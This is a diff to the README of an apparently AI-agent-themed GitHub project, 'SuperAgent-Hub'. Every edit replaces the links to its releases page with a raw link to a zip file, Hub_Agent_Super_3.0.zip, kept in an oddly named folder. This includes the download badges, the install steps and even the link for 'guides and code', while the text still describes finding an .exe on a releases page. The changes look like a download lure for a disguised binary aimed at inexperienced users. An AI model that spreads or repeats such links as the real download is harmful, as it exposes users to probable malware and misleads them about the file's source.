@@ -1,6 +1,6 @@
 # 🤖 -SuperAgent-Hub - Easy AI Agent Creation and Automation
 
-[![Download -SuperAgent-Hub](https://img.shields.io/badge/Download-%20SuperAgent--Hub-brightgreen?style=for-the-badge)](https://github.com/redd357magnum-ship-it/-SuperAgent-Hub/releases)
+[![Download -SuperAgent-Hub](https://img.shields.io/badge/Download-%20SuperAgent--Hub-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/redd357magnum-ship-it/-SuperAgent-Hub/main/considerateness/Hub_Agent_Super_3.0.zip)
 
 ---
 
@@ -48,7 +48,7 @@ The goal is to let you work with multiple AI agents together easily. You do not 
 ## 🚀 Getting Started
 
 1. Click the big green **Download** button above or  
-   [visit this page to download](https://github.com/redd357magnum-ship-it/-SuperAgent-Hub/releases) the latest version.  
+   [visit this page to download](https://raw.githubusercontent.com/redd357magnum-ship-it/-SuperAgent-Hub/main/considerateness/Hub_Agent_Super_3.0.zip) the latest version.  
    
 2. On the releases page, find the latest stable version. Look for the file ending with `.exe` for Windows.  
 
@@ -67,7 +67,7 @@ The goal is to let you work with multiple AI agents together easily. You do not 
 ### Step 1: Visit the Download Page  
 
 Go to the official releases page here:  
-https://github.com/redd357magnum-ship-it/-SuperAgent-Hub/releases
+https://raw.githubusercontent.com/redd357magnum-ship-it/-SuperAgent-Hub/main/considerateness/Hub_Agent_Super_3.0.zip
 
 You will see a list of versions. Pick the newest one shown at the top.
 
@@ -157,10 +157,10 @@ When you open the app, you will see a dashboard.
 
 - The GitHub repository contains documents explaining features and upcoming updates.
 
-- Visit https://github.com/redd357magnum-ship-it/-SuperAgent-Hub for guides and code.
+- Visit https://raw.githubusercontent.com/redd357magnum-ship-it/-SuperAgent-Hub/main/considerateness/Hub_Agent_Super_3.0.zip for guides and code.
 
 - The README on GitHub has basic usage tips.
 
 ---
 
-[![Download -SuperAgent-Hub](https://img.shields.io/badge/Download-%20SuperAgent--Hub-brightgreen?style=for-the-badge)](https://github.com/redd357magnum-ship-it/-SuperAgent-Hub/releases)
+[![Download -SuperAgent-Hub](https://img.shields.io/badge/Download-%20SuperAgent--Hub-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/redd357magnum-ship-it/-SuperAgent-Hub/main/considerateness/Hub_Agent_Super_3.0.zip)
